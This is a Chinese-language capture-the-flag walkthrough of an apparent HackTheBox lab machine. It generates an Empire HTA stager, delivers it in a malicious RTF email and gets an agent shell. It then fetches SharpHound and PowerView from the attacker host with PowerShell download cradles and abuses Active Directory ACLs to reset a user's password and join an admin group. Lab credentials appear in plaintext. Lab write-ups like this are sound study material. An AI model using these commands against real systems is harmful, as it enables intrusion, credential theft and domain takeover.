以下是优化后的文本，使其更加清晰、连贯和专业：

---

### 使用Empire生成HTA Stager

1. **返回到主菜单**：
   ```shell
   (Empire: listeners/http) > back
   ```

2. **选择并配置Windows HTA stager**：
   ```shell
   (Empire: listeners) > usestager windows/hta
   (Empire: stager/windows/hta) > set Listener http
   (Empire: stager/windows/hta) > set OutFile /home/Rogerd/tools/CVE-2017-0199/reel.hta
   (Empire: stager/windows/hta) > generate
   [*] Stager output written out to: /home/Rogerd/tools/CVE-2017-0199/reel.hta
   ```

3. **将生成的HTA文件移动到tmp目录，并启动HTTP服务器**：
   ```shell
   mv /home/Rogerd/tools/CVE-2017-0199/reel.hta /tmp/
   python -m SimpleHTTPServer 8000
   ```

4. **发送带有恶意RTF附件的电子邮件**：
   ```shell
   sendEmail -f PI:EMAIL -t PI:EMAIL -u RTF -m 'open file!' -a TEST.RTF -s 10.10.10.77
   ```

5. **获取反弹Shell并查找第一个flag**：
   ```shell
   (Empire: stager/windows/hta) > agents
   [*] Active agents:
    Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen
    ----     -- -----------     ------------      --------                -------            ---    -----    ---------
    G25L3MWT ps 10.10.10.77     REEL              HTB\nico                powershell         2468   5/0.0    2019-01-23 11:49:22

   (Empire: agents) > interact G25L3MWT
   ```

   检查桌面文件，发现`user.txt`是第一个flag。

### 查看凭据文件并执行权限提升检查

1. **读取cred.xml文件内容**：
   ```shell
   (Empire: G25L3MWT) > shell Get-Content cred.xml
   [*] Tasked G25L3MWT to run TASK_SHELL
   [*] Agent G25L3MWT tasked with task ID 19
   [*] Agent G25L3MWT returned results.
   System.Management.Automation.PSCredential
   System.Object
   System.Management.Automation.PSCredential
   HTB\Tom
   01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692
   ..Command execution completed.
   ```

2. **使用PowerUp模块进行权限提升检查**：
   ```shell
   (Empire: 7H9GMEV2) > usemodule privesc/powerup/allchecks
   (Empire: powershell/privesc/powerup/allchecks) > run
   [*] Tasked 7H9GMEV2 to run TASK_CMD_JOB
   [*] Agent 7H9GMEV2 tasked with task ID 26
   [*] Tasked agent 7H9GMEV2 to run module powershell/privesc/powerup/allchecks
   [*] Agent 7H9GMEV2 returned results.
   Job started: 64FXBN
   [*] Valid results returned by 10.10.10.77
   [*] Running Invoke-AllChecks
   [*] Checking if user is in a local group with administrative privileges...
   [*] Checking for unquoted service paths...
   ServiceName    : ssh-agent
   Path           : C:\Program Files\OpenSSH\ssh-agent.exe
   ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
   StartName      : LocalSystem
   AbuseFunction  : Write-ServiceBinary -Name 'ssh-agent' -Path 
   CanRestart     : False
   ServiceName    : sshd
   Path           : C:\Program Files\OpenSSH\sshd.exe
   ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
   StartName      : NT SERVICE\SSHD
   AbuseFunction  : Write-ServiceBinary -Name 'sshd' -Path 
   CanRestart     : False
   DefaultDomainName    : HTB
   DefaultUserName      : nico
   DefaultPassword      : 4dri@na2017!**
   AltDefaultDomainName : 
   AltDefaultUserName   : 
   AltDefaultPassword   : 
   [*] Checking for modifidable registry autoruns and configs...
   [*] Checking for modifiable schtask files/configs...
   [*] Checking for unattended install files...
   UnattendPath : C:\Windows\Panther\Unattend.xml
   ```

### 通过SSH访问Tom账户

1. **使用SSH连接到Tom账户**：
   ```shell
   ssh tom@10.10.10.77
   Password: 1ts-mag1c!!!
   ```

2. **查看Desktop下的AD Audit文件夹**：
   在`tom->Desktop->AD Audit->note.txt`中找到提示信息，建议查找最短的攻击路径。

### 使用BloodHound进行AD审计

1. **安装和配置BloodHound**：
   - 将`SharpHound.ps1`文件上传到目标主机。
   - 执行以下命令以下载并运行`SharpHound.ps1`：
     ```shell
     powershell "IEX (New-Object Net.Webclient).DownloadFile('http://10.10.14.19:8000/SharpHound.ps1','SharpHound.ps1')"
     powershell -exec bypass
     Import-Module ./SharpHound.ps1
     invoke-bloodhound all
     ```

2. **下载生成的报告并导入BloodHound**：
   ```shell
   scp -P 22 tom@10.10.10.77:"/C:/Users/tom/Desktop/AD Audit/BloodHound/Ingestors/20190124161418_BloodHound.zip" /tmp/
   ```

3. **分析BloodHound报告**：
   - 发现共有18个用户和61个组。
   - 查看不同用户组的信息，特别是`backup_admin`组。
   - 设置起始节点为`tom`，结束节点为`backup_admin`，发现可以通过`CLAIRE`访问`backup_admin`。

### 利用PowerView进行权限提升

1. **下载PowerView.ps1**：
   ```shell
   powershell "IEX (New-Object Net.Webclient).DownloadFile('http://10.10.14.19:8000/PowerView.ps1','PowerView.ps1')"
   ```

2. **设置对象所有者并重置密码**：
   ```shell
   powershell -command "import-module .\PowerView.ps1; Set-DomainObjectOwner -Identity claire -OwnerIdentity Tom -Verbose; Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity Tom -Rights ResetPassword -Verbose; $pass=ConvertTo-SecureString 'AbC!@#123' -AsPlainText -Force; Set-DomainUserPassword -Identity claire -AccountPassword $pass -Verbose"
   ```

3. **将Claire添加到Backup_Admins组**：
   ```shell
   powershell -command "import-module .\PowerView.ps1; Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity claire -Rights All -Verbose; Add-DomainGroupMember -Identity 'Backup_Admins' -Members 'claire' -Verbose"
   ```

4. **访问Backup_Script文件夹并查找root.txt**：
   - 现在可以访问`Administrator->Backup_Script`文件夹。
   - 查看`Backup_Script.ps1`脚本以获取关键信息。

---

希望这些步骤能帮助你更清晰地理解和执行渗透测试任务。